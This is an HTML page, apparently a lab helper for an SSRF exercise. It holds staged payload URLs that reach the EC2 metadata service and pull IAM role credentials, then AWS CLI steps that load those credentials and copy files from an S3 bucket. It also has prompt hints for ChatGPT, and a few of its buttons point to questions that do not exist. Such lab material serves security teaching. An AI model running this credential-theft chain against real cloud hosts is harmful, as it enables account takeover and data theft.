@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>SSRF Vulnerability</title>
+  <style>
+    .sentence {
+      margin-bottom: 10px;
+    }
+    table {
+      border-collapse: collapse;
+      width: 100%;
+    }
+    th, td {
+      border: 1px solid black;
+      padding: 8px;
+    }
+    th {
+      text-align: left;
+    }
+  </style>
+  <script>
+    const hints = [
+      "Research and explain the concept of Server-Side Request Forgery (SSRF) attacks.",
+      "Discuss how SSRF attacks can be used to exploit vulnerable systems.",
+      "Explain the potential impact of successful SSRF attacks.",
+      "Discuss common prevention techniques and mitigation strategies for SSRF vulnerabilities."
+    ];
+
+    const questions = [
+      "Can you provide an overview of Server-Side Request Forgery (SSRF) attacks?",
+      "What are some examples of real-world scenarios where SSRF attacks have been successfully executed?",
+      "How can SSRF vulnerabilities be discovered and exploited?",
+      "What are the potential consequences of a successful SSRF attack on an application or infrastructure?",
+      "How does AWS EC2 handle user input validation and sanitization when making requests to external resources?",
+      "Are the EC2 instance metadata and user-data endpoints properly secured?",
+      "What security measures are in place to detect and mitigate SSRF attacks?",
+      "Have all EC2 instances been configured with the principle of least privilege?"
+    ];
+
+    const ssrfExamples = [
+      {
+        payload: "http://ssrf.cloudbutton.net/index.php?url=http://169.254.169.254",
+        explanation: "This payload attempts to access the metadata service endpoint 'http://169.254.169.254' through the 'url' parameter on the vulnerable server."
+      },
+      {
+        payload: "http://ssrf.cloudbutton.net/index.php?url=http://169.254.169.254/latest",
+        explanation: "This payload attempts to access the 'latest' path on the metadata service endpoint 'http://169.254.169.254' through the 'url' parameter on the vulnerable server."
+      },
+      {
+        payload: "http://ssrf.cloudbutton.net/index.php?url=http://169.254.169.254/latest/meta-data",
+        explanation: "This payload attempts to access the 'meta-data' path on the metadata service endpoint 'http://169.254.169.254/latest' through the 'url' parameter on the vulnerable server."
+      },
+      {
+        payload: "http://ssrf.cloudbutton.net/index.php?url=http://169.254.169.254/latest/meta-data/iam",
+        explanation: "This payload attempts to access the 'iam' path on the metadata service endpoint 'http://169.254.169.254/latest/meta-data' through the 'url' parameter on the vulnerable server."
+      },
+      {
+        payload: "http://ssrf.cloudbutton.net/index.php?url=http://169.254.169.254/latest/meta-data/iam/",
+        explanation: "This payload attempts to access the 'iam' path on the metadata service endpoint 'http://169.254.169.254/latest/meta-data/' through the 'url' parameter on the vulnerable server."
+      },
+      {
+        payload: "http://ssrf.cloudbutton.net/index.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        explanation: "This payload attempts to access the 'security-credentials' path on the metadata service endpoint 'http://169.254.169.254/latest/meta-data/iam/' through the 'url' parameter on the vulnerable server."
+      },
+      {
+        payload: "http://ssrf.cloudbutton.net/index.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/CB-SSRF",
+        explanation: "This payload attempts to access the 'CB-SSRF' security credentials on the metadata service endpoint 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' through the 'url' parameter on the vulnerable server."
+      }
+    ];
+
+const awsCliHints = [
+  {
+    payload: "https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html",
+    explanation: "The provided link is for the AWS CLI installation documentation. It provides instructions for installing the AWS CLI on various operating systems."
+  },
+  {
+    payload: "vim .aws/credentials",
+    explanation: "The command vim .aws/credentials opens the AWS credentials file for editing. This file stores the AWS access key ID, secret access key, and session token used for authentication when interacting with AWS services through the command line."
+  },
+  {
+    payload: "aws configure set aws_access_key_id YOUR_ACCESS_KEY_ID",
+    explanation: "This command sets the AWS access key ID value in the AWS CLI configuration. Replace YOUR_ACCESS_KEY_ID with the actual access key ID value obtained from the URL: http://ssrf.cloudbutton.net/index.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/CB-SSRF"
+  },
+  {
+    payload: "aws configure set aws_secret_access_key YOUR_SECRET_ACCESS_KEY",
+    explanation: "This command sets the AWS secret access key value in the AWS CLI configuration. Replace YOUR_SECRET_ACCESS_KEY with the actual secret access key value obtained from the URL: http://ssrf.cloudbutton.net/index.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/CB-SSRF"
+  },
+  {
+    payload: "aws configure set aws_session_token YOUR_SESSION_TOKEN",
+    explanation: "This command sets the AWS session token value in the AWS CLI configuration. Replace YOUR_SESSION_TOKEN with the actual session token value obtained from the URL: http://ssrf.cloudbutton.net/index.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/CB-SSRF"
+  },
+  {
+    payload: "aws s3 ls cloudbutton-deleteme",
+    explanation: "This command lists the contents of the 'cloudbutton-deleteme' bucket in Amazon S3."
+  },
+  {
+    payload: "aws s3 cp s3://cloudbutton-deleteme/testfile.txt ./",
+    explanation: "This command copies the 'testfile.txt' file from the 'cloudbutton-deleteme' bucket in Amazon S3 to the current directory."
+  }
+  // Add more objects as needed
+];
+
+
+    let prompt = "";
+
+    function displayHint(index) {
+      prompt += hints[index] + " ";
+      document.getElementById("prompt").textContent = prompt;
+    }
+
+    function reset() {
+      prompt = "";
+      document.getElementById("prompt").textContent = "";
+    }
+
+    function copyPrompt() {
+      const textarea = document.createElement("textarea");
+      textarea.value = prompt;
+      document.body.appendChild(textarea);
+      textarea.select();
+      document.execCommand("copy");
+      document.body.removeChild(textarea);
+      alert("Prompt copied to clipboard. You can now paste it into the chatbox for ChatGPT and begin a new conversation.");
+      openChatGPT(prompt);
+    }
+
+    function openChatGPT(prompt) {
+      const chatURL = "https://chat.openai.com/";
+      const newTab = window.open(chatURL, "_blank");
+      newTab.onload = function () {
+        const chatInput = newTab.document.querySelector('input[placeholder="Type your message here"]');
+        chatInput.value = prompt;
+        chatInput.dispatchEvent(new Event("input", { bubbles: true }));
+      };
+    }
+
+    function copyQuestionAndAsk(question) {
+      const textarea = document.createElement("textarea");
+      textarea.value = question;
+      document.body.appendChild(textarea);
+      textarea.select();
+      document.execCommand("copy");
+      document.body.removeChild(textarea);
+      alert(`Question copied to clipboard. You can now paste it into your existing ChatGPT conversation and see what information it returns: "${question}"`);
+    }
+
+    let currentSSRFExampleIndex = 0;
+
+    function copySSRFExample(index) {
+      const example = ssrfExamples[index];
+      const textarea = document.createElement("textarea");
+      textarea.value = example.payload;
+      document.body.appendChild(textarea);
+      textarea.select();
+      document.execCommand("copy");
+      document.body.removeChild(textarea);
+      alert(`SSRF Example ${index + 1} copied to clipboard:\n\n${example.payload}`);
+    }
+
+function provideSSRFExamples() {
+  if (currentSSRFExampleIndex < ssrfExamples.length) {
+    const example = ssrfExamples[currentSSRFExampleIndex];
+    const url = example.payload;
+
+    const newTab = window.open(url, "_blank");
+    if (newTab) {
+      newTab.opener = null; // Prevent opening a new tab in the current window
+      newTab.focus();
+    } else {
+      alert("Pop-up blocker is preventing opening a new tab. Please allow pop-ups for this website.");
+    }
+
+    const table = document.getElementById("ssrf-examples-table");
+    const row = table.insertRow();
+
+    const urlCell = row.insertCell();
+    const explanationCell = row.insertCell();
+
+    urlCell.textContent = url;
+    explanationCell.textContent = example.explanation;
+
+    urlCell.style.wordWrap = "break-word"; // Apply word wrapping to the URL cell
+    explanationCell.style.wordWrap = "break-word"; // Apply word wrapping to the explanation cell
+
+    const textarea = document.createElement("textarea");
+    textarea.value = url;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand("copy");
+    document.body.removeChild(textarea);
+
+    currentSSRFExampleIndex++;
+  } else {
+    alert("You have reached the end of the SSRF attack examples.");
+  }
+}
+
+
+  
+let currentAwsCliHintIndex = 0;
+
+function provideAwsCliHints() {
+  const awsCliHintsTable = document.getElementById("aws-cli-hints-table");
+  
+  if (currentAwsCliHintIndex < awsCliHints.length) {
+    const hint = awsCliHints[currentAwsCliHintIndex];
+    const row = document.createElement("tr");
+    const payloadCell = document.createElement("td");
+    const explanationCell = document.createElement("td");
+    
+    payloadCell.textContent = hint.payload;
+    explanationCell.textContent = hint.explanation;
+    
+    payloadCell.style.wordWrap = "break-word"; // Apply word wrapping to the payload cell
+    explanationCell.style.wordWrap = "break-word"; // Apply word wrapping to the explanation cell
+    
+    row.appendChild(payloadCell);
+    row.appendChild(explanationCell);
+    awsCliHintsTable.appendChild(row);
+    
+    currentAwsCliHintIndex++;
+  } else {
+    // Disable the button or display a message indicating no more hints
+    const addButton = document.getElementById("add-aws-cli-hint-button");
+    addButton.disabled = true;
+    addButton.textContent = "No More Hints Available";
+  }
+}
+
+
+    function renderPayload(payload) {
+      const textarea = document.createElement("textarea");
+      textarea.innerHTML = payload;
+      return textarea.value;
+    }
+  </script>
+</head>
+<body>
+  <div class="sentence">
+    <h2>How to Use the Prompt Sentence Viewer:</h2>
+    <ol>
+      <li>Click on the numbered buttons to reveal each sentence of the prompt. Each click displays an additional sentence.</li>
+      <li>Once all the sentences are revealed, the entire prompt will be displayed.</li>
+      <li>Click the "Copy Prompt" button to copy the entire prompt to your clipboard. You can now paste the prompt into the opened tab of the ChatGPT application.</li>
+    </ol>
+  </div>
+  <h1>Prompt Sentence Viewer</h1>
+  <div class="sentence">
+    <button onclick="displayHint(0)">Hint 1</button>
+    <button onclick="displayHint(1)">Hint 2</button>
+    <button onclick="displayHint(2)">Hint 3</button>
+    <button onclick="displayHint(3)">Hint 4</button>
+  </div>
+  <div class="sentence">
+    <button onclick="copyPrompt()">Copy Prompt</button>
+  </div>
+  <div class="sentence">
+    <h2>Prompt:</h2>
+    <p id="prompt"></p>
+  </div>
+  <div class="sentence">
+    <h2>If you are stuck and need ideas for questions, follow these steps:</h2>
+    <ol>
+      <li>Click on the pre-defined question buttons.</li>
+      <li>The selected question will be copied to your clipboard.</li>
+      <li>Paste the copied question into your existing ChatGPT conversation to see what information it returns.</li>
+    </ol>
+  </div>
+  <div class="sentence">
+    <ul>
+      <li><button onclick="copyQuestionAndAsk(questions[0])">Question 1</button></li>
+      <li><button onclick="copyQuestionAndAsk(questions[1])">Question 2</button></li>
+      <li><button onclick="copyQuestionAndAsk(questions[2])">Question 3</button></li>
+      <li><button onclick="copyQuestionAndAsk(questions[3])">Question 4</button></li>
+      <li><button onclick="copyQuestionAndAsk(questions[4])">Question 5</button></li>
+      <li><button onclick="copyQuestionAndAsk(questions[5])">Question 6</button></li>
+      <li><button onclick="copyQuestionAndAsk(questions[6])">Question 7</button></li>
+      <li><button onclick="copyQuestionAndAsk(questions[7])">Question 8</button></li>
+      <li><button onclick="copyQuestionAndAsk(questions[8])">Question 9</button></li>
+      <li><button onclick="copyQuestionAndAsk(questions[9])">Question 10</button></li>
+    </ul>
+  </div>
+  <div class="sentence">
+    <h2>Instructions for SSRF Attack Examples:</h2>
+    <ol>
+<li>Click the "Generate SSRF Attack Examples" button to view the SSRF attack examples.</li>
+<li>The examples will be displayed in the table below.</li>
+<li>Each example consists of an SSRF URL and an explanation.</li>
+<li>Clicking the "Generate SSRF Attack Examples" button again will display the next example, if available.</li>
+<li>A new tab will be opened with the SSRF URL </li>
+    </ol>
+  </div>
+  <div class="sentence">
+    <h2>SSRF Attack Examples:</h2>
+    <table id="ssrf-examples-table">
+      <tr>
+        <th>SSRF URL </th>
+        <th>Explanation</th>
+      </tr>
+    </table>
+    <button onclick="provideSSRFExamples()">Generate SSRF Attack Examples</button>
+  </div>
+    <div class="sentence">
+    <h2>AWS CLI Hints:</h2>
+    <table id="aws-cli-hints-table">
+      <tr>
+        <th>AWS CLI Hint</th>
+        <th>Explanation</th>
+      </tr>
+    </table>
+    <button id="add-aws-cli-hint-button" onclick="provideAwsCliHints()">Add AWS CLI Hint</button>
+  </div>
+</body>
+</html>
